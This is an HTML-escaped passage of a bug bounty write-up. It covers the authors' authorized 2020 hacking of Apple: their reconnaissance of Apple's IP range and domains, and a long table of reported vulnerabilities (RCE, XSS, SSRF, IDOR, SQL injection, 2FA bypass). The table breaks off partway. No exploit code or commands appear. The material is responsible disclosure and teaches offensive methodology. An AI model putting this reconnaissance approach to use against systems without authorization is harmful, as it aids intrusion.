&lt;blockquote class=&quot;twitter-tweet&quot; data-width=&quot;550&quot; data-dnt=&quot;true&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Zero-day in Sign in with Apple - bounty $100k&lt;a href=&quot;https://t.co/9lGeXcni3K&quot;&gt;https://t.co/9lGeXcni3K&lt;/a&gt;&lt;/p&gt;
— Bhavuk Jain (@bhavukjain1) &lt;a href=&quot;https://twitter.com/bhavukjain1/status/1266755207402143746?ref_src=twsrc%5Etfw&quot;&gt;May 30, 2020&lt;/a&gt;&lt;/blockquote&gt;
&lt;p&gt;After finishing the article, I did a quick Google search and found their program page where it detailed Apple was willing to pay for vulnerabilities &quot;with significant impact to users&quot; regardless of whether or not the asset was explicitly listed in scope.&lt;/p&gt;
&lt;p&gt;This caught my attention as an interesting opportunity to investigate a new program which appeared to have a wide scope and fun functionality. At the time I had never worked on the Apple bug bounty program so I didn't really have any idea what to expect but decided why not try my luck and see what I could find.&lt;/p&gt;
&lt;p&gt;In order to make the project more fun I sent a few messages to hackers I'd worked with in the past and asked if they'd like to work together on the program. Even though there was no guarantee regarding payouts nor an understanding of how the program worked, everyone said yes, and we began hacking on Apple.&lt;/p&gt;
&lt;h2&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;The first step in hacking Apple was figuring out what to actually target. Both Ben and Tanner were the experts here, so they began figuring out what all Apple owned that was accessible to us. All of the results from their scanning were indexed in a dashboard that included the HTTP status code, headers, response body, and screenshot of the accessible web servers under the various domains owned by Apple that we’d refer to over the engagement.&lt;/p&gt;
&lt;img src=&quot;https://lh5.googleusercontent.com/ZI5uyCrD-ZNLEejKEpUOcQLWgPYONCbK-KegFgN1uyTuJskZ-EL_ogejmRpXCD18tOwgpEHFErKPoJRjmSmJIHqnY8u0zY_uVhKeRm38bdHcO-Kmh9Dlb0XFYgRiAR0SZybumqGw&quot; alt=&quot;&quot;/&gt;&lt;p&gt;To be brief: Apple's infrastructure is massive.&lt;/p&gt;
&lt;p&gt;They own the entire 17.0.0.0/8 IP range, which includes 25,000 web servers with 10,000 of them under apple.com, another 7,000 unique domains, and to top it all off, their own TLD (dot apple). Our time was primarily spent on the 17.0.0.0/8 IP range, .apple.com, and .icloud.com since that was where the interesting functionality appeared to be.&lt;/p&gt;
&lt;p&gt;After making a listing of all of the web servers, we began running directory brute forcing on the more interesting ones.&lt;/p&gt;
&lt;p&gt;Some of the immediate findings from the automated scanning were...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;VPN servers affected by Cisco CVE-2020-3452 Local File Read 1day (x22)&lt;/li&gt;
&lt;li&gt;Leaked Spotify access token within an error message on a broken page&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The information obtained by these processes were useful in understanding how authorization/authentication worked across Apple, what customer/employee applications existed, what integration/development tools were used, and various observable behaviors like web servers consuming certain cookies or redirecting to certain applications.&lt;/p&gt;
&lt;p&gt;After all of the scans were completed and we felt we had a general understanding of the Apple infrastructure, we began targeting individual web servers that felt instinctively more likely to be vulnerable than others.&lt;/p&gt;
&lt;p&gt;This began a series of findings that continued throughout our engagement and progressively increased our understanding of Apple’s program.&lt;/p&gt;
&lt;h2&gt;Vulnerabilities Discovered&lt;/h2&gt;

&lt;table id=&quot;findings&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;&lt;strong&gt;Report ID&lt;/strong&gt;&lt;/th&gt;
&lt;th class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;&lt;strong&gt;Date&lt;/strong&gt;&lt;/th&gt;
&lt;th class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;&lt;strong&gt;Title&lt;/strong&gt;&lt;/th&gt;
&lt;th class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;&lt;strong&gt;Severity&lt;/strong&gt;&lt;/th&gt;
&lt;th class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;&lt;strong&gt;Sort&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;741765282&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/26/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Remote Code Execution via Authorization and Authentication Bypass&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;747008210&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;9/17/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Authentication Bypass via Misconfigured Permissions allows Global Administrator Access&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743305978&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/11/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Command Injection via Unsanitized Filename Argument&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744391544&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/21/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Remote Code Execution via Leaked Secret and Exposed Administrator Tool&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;741014809&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/18/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Memory Leak leads to Employee and User Account Compromise allowing access to various internal applications&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;742879257&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/6/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Vertica SQL Injection via Unsanitized Input Parameter&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;742693737&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/5/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Wormable Stored XSS allows Attacker to Fully Compromise Victim iCloud Account&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743695576&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/14/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Wormable Stored XSS allows Attacker to Fully Compromise Victim iCloud Account&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;742909161&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/7/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Full Response SSRF allows Attacker to Read Internal Source Code and Access Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;745400606&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;9/1/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Blind XSS allows Attacker to Access Internal Support Portal for Customer and Employee Issue Tracking&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744376677&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/21/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Server Side PhantomJS Execution allows attacker to Access Internal Resources and Retrieve AWS IAM Keys&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Critical&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743197992&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/10/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR allows Attacker to Read Full User Application Details for Apple Partner Application&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743661939&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/14/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR on iCloud Allows Attacker to Retrieve Victim Name and Email address via Incremental Numeric Identifier&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744278275&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/20/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Blind XSS allows Attacker to Access Apple Maps Management Application and Modify Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743337186&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/12/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Blind XSS allows Attacker to Access Apple Books Management Application and Modify Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;745697928&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;9/4/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Blind XSS allows Attacker to Access Apple Books Management Application and Modify Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744190911&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/19/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Various 2FA Bypasses allow Attacker to Access Account Details without Solving MFA Challenge&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744172712&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/19/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Reflected XSS within Various Apple Authentication Systems&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;741856747&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/1/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;XXE via Enabled External Entity Processing&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;745468499&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;9/2/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Lack of Access Control on Apple Application allows Attacker to Retrieve Name, Address, Phone Number, and Contact Information of All Users&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;745467385&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;9/2/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR on Apple Application allows Attacker to Read Protected Information about Users&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;742383828&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/1/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR on Apple Application allows Attacker to Read Protected Information about Users&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;741425582&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/22/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;SSRF on Apple Application allows Attacker to send Internal Gopher Requests&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;742326610&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/31/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR on Apple Application allows Attacker to Read Protected Information about Users&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;739884965&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/5/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR on Apple App Store allows Attacker to Modify Various Components of Apple Store Applications&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;741782188&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/26/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Various VPNs Affected by Local File Disclosure Vulnerability&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;742775989&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/5/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;SSRF within Apple Application allows attacker to Access Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;742778854&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/5/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;SSRF within Apple Application allows attacker to Access Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744525657&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/24/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;SSRF within Apple Application allows attacker to Access Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744327113&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/21/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR on Apple Application allows Attacker to Enumerate User Information&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;745360827&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;9/1/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR on Apple Application allows Attacker to Enumerate User Information&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;740621036&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/15/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR on Apple Application allows Attacker to Enumerate User Information&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743044563&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/11/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;SSRF within Apple Application allows attacker to Access Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743675019&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/14/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;IDOR on Apple Application allows Attacker to Enumerate User Information&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;740944358&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/17/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;SSRF within Apple Application allows attacker to Access Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;742879259&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/6/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Improper Access Control on Apple Application allows Attacker to Disclose and Modify Internal Application Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;740610570&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/16/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Stored XSS on Apple Application allows Attacker to Escalate Privileges and Compromise Tenant Applications&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;743047726&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/4/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Lack of Rate Limiting on Apple Application allows attacker to Validate and Access Protected Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;744308191&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;8/20/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Stored XSS via Unrestricted File Upload&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;High&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;745710818&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;9/4/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Reflected XSS allows Attacker to Fully Compromise Tenant Resources&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;745356272&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;9/1/2020&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Path Traversal allows Attacker to Enumerate System File Information&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;Medium&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;739271635&lt;/td&gt;
&lt;td class=&quot;has-text-align-center&quot; data-align=&quot;center&quot;&gt;7/7/2020&lt;/td&gt;
